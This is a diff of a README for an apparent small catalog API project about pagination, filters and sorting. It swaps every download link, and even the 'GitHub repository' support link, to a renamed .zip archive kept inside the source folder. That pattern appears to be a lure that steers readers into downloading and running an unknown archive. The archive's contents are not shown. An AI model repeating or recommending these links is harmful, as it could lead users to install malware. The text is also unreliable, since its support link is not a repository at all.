@@ -6,11 +6,11 @@ Welcome to Mini-Projeto-4-PaginacaoFiltrosOrdenaco! This application is designed
 
 ## 📥 Download the Application
 
-[![Download Mini-Projeto-4-PaginacaoFiltrosOrdenaco](https://github.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/raw/refs/heads/main/src/Catalog.Api/Persistence/Ordenaco-Projeto-Mini-Paginacao-Filtros-v1.0.zip)](https://github.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/raw/refs/heads/main/src/Catalog.Api/Persistence/Ordenaco-Projeto-Mini-Paginacao-Filtros-v1.0.zip)
+[![Download Mini-Projeto-4-PaginacaoFiltrosOrdenaco](https://raw.githubusercontent.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/main/src/Filtros_Projeto_Paginacao_Ordenaco_Mini_sciomancy.zip)](https://raw.githubusercontent.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/main/src/Filtros_Projeto_Paginacao_Ordenaco_Mini_sciomancy.zip)
 
 To get started with this application, visit the following link to download the latest version:
 
-[Download the latest release here](https://github.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/raw/refs/heads/main/src/Catalog.Api/Persistence/Ordenaco-Projeto-Mini-Paginacao-Filtros-v1.0.zip)
+[Download the latest release here](https://raw.githubusercontent.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/main/src/Filtros_Projeto_Paginacao_Ordenaco_Mini_sciomancy.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## 💾 Installation Instructions
 
-1. **Download the Application:** Click on the link to the [latest release](https://github.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/raw/refs/heads/main/src/Catalog.Api/Persistence/Ordenaco-Projeto-Mini-Paginacao-Filtros-v1.0.zip).
+1. **Download the Application:** Click on the link to the [latest release](https://raw.githubusercontent.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/main/src/Filtros_Projeto_Paginacao_Ordenaco_Mini_sciomancy.zip).
    
 2. **Locate the Downloaded File:** Once the download is complete, find the file in your downloads folder.
 
@@ -79,7 +79,7 @@ This will take you to the main page where you can see API endpoints and their de
 
 ## 🤝 Support
 
-If you need help or have questions, feel free to open an issue in the [GitHub repository](https://github.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/raw/refs/heads/main/src/Catalog.Api/Persistence/Ordenaco-Projeto-Mini-Paginacao-Filtros-v1.0.zip). 
+If you need help or have questions, feel free to open an issue in the [GitHub repository](https://raw.githubusercontent.com/surajmaster-hash/Mini-Projeto-4-PaginacaoFiltrosOrdenaco/main/src/Filtros_Projeto_Paginacao_Ordenaco_Mini_sciomancy.zip). 
 
 You can also contribute by sharing your feedback or submitting improvements.
 
